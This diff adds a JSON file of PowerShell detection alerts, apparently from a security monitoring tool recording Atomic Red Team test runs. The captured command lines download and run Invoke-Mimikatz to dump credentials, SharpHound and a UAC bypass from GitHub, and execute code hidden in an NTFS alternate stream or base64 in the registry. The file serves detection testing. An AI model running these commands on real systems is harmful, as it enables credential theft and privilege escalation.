@@ -1,0 +1,92 @@
+[
+  {
+    "alert_id": 138,
+    "guid": "fc4c96d3-919f-6a53-8d02-000000001500",
+    "confidence": "HIGH",
+    "summary": "Suspicious PowerShell Execution (AMSI+Cmdline Dual-Layer) | [T1027 obfuscated:0.60]",
+    "patterns": "Invoke-Expression",
+    "score": 0.6026,
+    "cmdline": "C:\\\\WINDOWS\\\\System32\\\\sdiagnhost.exe -Embedding"
+  },
+  {
+    "alert_id": 139,
+    "guid": "fc4c96d3-92ca-6a53-f702-000000001500",
+    "confidence": "HIGH",
+    "summary": "Suspicious PowerShell Execution (AMSI+Cmdline Dual-Layer)",
+    "patterns": "Invoke-Expression",
+    "score": 0.3548,
+    "cmdline": "\\\"powershell.exe\\\" &amp; {Add-Content -Path $env:TEMP\\\\NTFS_ADS.txt -Value 'Write-Host \\\\\\\"\\\"Stream Data Executed\\\\\\\"\\\"' -Stream 'streamCommand' $streamcommand = Get-Content -Path $env:TEMP\\\\NTFS_ADS.txt -Stream 'streamcommand' Invoke-Expression $streamcommand}"
+  },
+  {
+    "alert_id": 140,
+    "guid": "fc4c96d3-92eb-6a53-0803-000000001500",
+    "confidence": "HIGH",
+    "summary": "Suspicious PowerShell Execution (AMSI+Cmdline Dual-Layer)",
+    "patterns": "Invoke-Mimikatz, Net.WebClient, DownloadString, IEX (",
+    "score": 0.3559,
+    "cmdline": "powershell.exe  \\\"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds\\\""
+  },
+  {
+    "alert_id": 141,
+    "guid": "fc4c96d3-92eb-6a53-0803-000000001500",
+    "confidence": "HIGH",
+    "summary": "Suspicious PowerShell Execution (AMSI+Cmdline Dual-Layer)",
+    "patterns": "Invoke-Mimikatz, Invoke-ReflectivePEInjection",
+    "score": 0.3559,
+    "cmdline": "powershell.exe  \\\"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds\\\""
+  },
+  {
+    "alert_id": 142,
+    "guid": "fc4c96d3-9325-6a53-0b03-000000001500",
+    "confidence": "HIGH",
+    "summary": "Suspicious PowerShell Execution (AMSI+Cmdline Dual-Layer)",
+    "patterns": "Net.WebClient, DownloadString, IEX (",
+    "score": 0.3739,
+    "cmdline": "\\\"powershell.exe\\\" &amp; {write-host \\\\\\\"\\\"Remote download of SharpHound.ps1 into memory, followed by execution of the script\\\\\\\"\\\" -ForegroundColor Cyan IEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1'); Invoke-BloodHound -OutputDirectory $env:Temp Start-Sleep 5}"
+  },
+  {
+    "alert_id": 143,
+    "guid": "fc4c96d3-933c-6a53-0f03-000000001500",
+    "confidence": "HIGH",
+    "summary": "Suspicious PowerShell Execution (AMSI+Cmdline Dual-Layer)",
+    "patterns": "Net.WebClient, DownloadString, IEX (",
+    "score": 0.3624,
+    "cmdline": "Powershell.exe  \\\"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\\\\Windows\\\\System32\\\\cmd.exe'\\\""
+  },
+  {
+    "alert_id": 144,
+    "guid": "fc4c96d3-9343-6a53-1603-000000001500",
+    "confidence": "HIGH",
+    "summary": "Suspicious PowerShell Execution (AMSI+Cmdline Dual-Layer)",
+    "patterns": "Invoke-WebRequest",
+    "score": 0.3488,
+    "cmdline": "powershell.exe  -exec bypass -noprofile \\\"$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.ps1',$False);$comMsXml.Send();IEX $comMsXml.ResponseText\\\""
+  },
+  {
+    "alert_id": 145,
+    "guid": "fc4c96d3-938a-6a53-1c03-000000001500",
+    "confidence": "HIGH",
+    "summary": "Suspicious PowerShell Execution (AMSI+Cmdline Dual-Layer) | [T1027 obfuscated:0.56]",
+    "patterns": "IEX (",
+    "score": 0.5559,
+    "cmdline": "\\\"powershell.exe\\\" &amp; {# Encoded payload in next command is the following \\\\\\\"\\\"Set-Content -path \\\\\\\"\\\"$env:SystemRoot/Temp/art-marker.txt\\\\\\\"\\\" -value \\\\\\\"\\\"Hello from the Atomic Red Team\\\\\\\"\\\"\\\\\\\"\\\" reg.exe add \\\\\\\"\\\"HKEY_CURRENT_USER\\\\Software\\\\Classes\\\\AtomicRedTeam\\\\\\\"\\\" /v ART /t REG_SZ /d \\\\\\\"\\\"U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0IiAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI=\\\\\\\"\\\" /f iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\\\\Software\\\\Classes\\\\AtomicRedTeam').ART)))}"
+  },
+  {
+    "alert_id": 146,
+    "guid": "fc4c96d3-938d-6a53-1f03-000000001500",
+    "confidence": "HIGH",
+    "summary": "Suspicious PowerShell Execution (AMSI+Cmdline Dual-Layer)",
+    "patterns": "Invoke-Expression",
+    "score": 0.3548,
+    "cmdline": "\\\"powershell.exe\\\" &amp; {Add-Content -Path $env:TEMP\\\\NTFS_ADS.txt -Value 'Write-Host \\\\\\\"\\\"Stream Data Executed\\\\\\\"\\\"' -Stream 'streamCommand' $streamcommand = Get-Content -Path $env:TEMP\\\\NTFS_ADS.txt -Stream 'streamcommand' Invoke-Expression $streamcommand}"
+  },
+  {
+    "alert_id": 147,
+    "guid": "fc4c96d3-9391-6a53-2103-000000001500",
+    "confidence": "HIGH",
+    "summary": "Suspicious PowerShell Execution (AMSI+Cmdline Dual-Layer)",
+    "patterns": "Invoke-Mimikatz, Invoke-Shellcode, Invoke-ReflectivePEInjection, Invoke-DllInjection, Get-GPPPassword, Get-VaultCredential, Add-Persistence, Get-Keystrokes",
+    "score": 0.3319,
+    "cmdline": "\\\"powershell.exe\\\" &amp; {$malcmdlets = \\\\\\\"\\\"Add-Persistence\\\\\\\"\\\", \\\\\\\"\\\"Find-AVSignature\\\\\\\"\\\", \\\\\\\"\\\"Get-GPPAutologon\\\\\\\"\\\", \\\\\\\"\\\"Get-GPPPassword\\\\\\\"\\\", \\\\\\\"\\\"Get-HttpStatus\\\\\\\"\\\", \\\\\\\"\\\"Get-Keystrokes\\\\\\\"\\\", \\\\\\\"\\\"Get-SecurityPackages\\\\\\\"\\\", \\\\\\\"\\\"Get-TimedScreenshot\\\\\\\"\\\", \\\\\\\"\\\"Get-VaultCredential\\\\\\\"\\\", \\\\\\\"\\\"Get-VolumeShadowCopy\\\\\\\"\\\", \\\\\\\"\\\"Install-SSP\\\\\\\"\\\", \\\\\\\"\\\"Invoke-CredentialInjection\\\\\\\"\\\", \\\\\\\"\\\"Invoke-DllInjection\\\\\\\"\\\", \\\\\\\"\\\"Invoke-Mimikatz\\\\\\\"\\\", \\\\\\\"\\\"Invoke-NinjaCopy\\\\\\\"\\\", \\\\\\\"\\\"Invoke-Portscan\\\\\\\"\\\", \\\\\\\"\\\"Invoke-ReflectivePEInjection\\\\\\\"\\\", \\\\\\\"\\\"Invoke-ReverseDnsLookup\\\\\\\"\\\", \\\\\\\"\\\"Invoke-Shellcode\\\\\\\"\\\", \\\\\\\"\\\"Invoke-TokenManipulation\\\\\\\"\\\", \\\\\\\"\\\"Invoke-WmiCommand\\\\\\\"\\\", \\\\\\\"\\\"Mount-VolumeShadowCopy\\\\\\\"\\\", \\\\\\\"\\\"New-ElevatedPersistenceOption\\\\\\\"\\\", \\\\\\\"\\\"New-UserPersistenceOption\\\\\\\"\\\", \\\\\\\"\\\"New-VolumeShadowCopy\\\\\\\"\\\", \\\\\\\"\\\"Out-CompressedDll\\\\\\\"\\\", \\\\\\\"\\\"Out-EncodedCommand\\\\\\\"\\\", \\\\\\\"\\\"Out-EncryptedScript\\\\\\\"\\\", \\\\\\\"\\\"Out-Minidump\\\\\\\"\\\", \\\\\\\"\\\"PowerUp\\\\\\\"\\\", \\\\\\\"\\\"PowerView\\\\\\\"\\\", \\\\\\\"\\\"Remove-Comments\\\\\\\"\\\", \\\\\\\"\\\"Remove-VolumeShadowCopy\\\\\\\"\\\", \\\\\\\"\\\"Set-CriticalProcess\\\\\\\"\\\", \\\\\\\"\\\"Set-MasterBootRecord\\\\\\\"\\\"  foreach ($cmdlets in $malcmdlets) {     \\\\\\\"\\\"function $cmdlets { Write-Host Pretending to invoke $cmdlets }\\\\\\\"\\\"} foreach ($cmdlets in $malcmdlets) {     $cmdlets}}"
+  }
+]
